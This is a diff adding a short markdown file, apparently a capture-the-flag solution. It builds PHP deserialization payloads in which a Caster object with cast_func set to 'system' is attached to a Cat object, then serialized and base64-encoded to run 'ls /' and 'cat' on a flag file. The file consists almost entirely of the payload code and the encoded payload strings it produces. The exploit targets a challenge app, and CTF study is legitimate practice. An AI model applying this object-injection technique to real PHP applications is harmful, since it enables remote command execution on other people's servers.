@@ -1,0 +1,38 @@
+## payload
+
+> ls
+
+```
+$_caster = new Caster();
+$_caster->cast_func = 'system';
+
+$_cat = new Cat("ls /");
+$_cat->magic = $_caster;
+
+$payload = base64_encode(serialize($_cat));
+```
+
+=> string(128) "TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjQ6ImxzIC8iO30="
+
+> cat
+
+
+```
+$_caster = new Caster();
+$_caster->cast_func = 'system';
+
+$_cat = new Cat("cat /flag_23907376917516c8");
+$_cat->magic = $_caster;
+
+$payload = base64_encode(serialize($_cat));
+```
+
+=> string(160) "TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjI2OiJjYXQgL2ZsYWdfMjM5MDczNzY5MTc1MTZjOCI7fQ=="
+
+## render
+
+```
+<pre>
+<?php var_dump($payload) ?>
+</pre>
+```
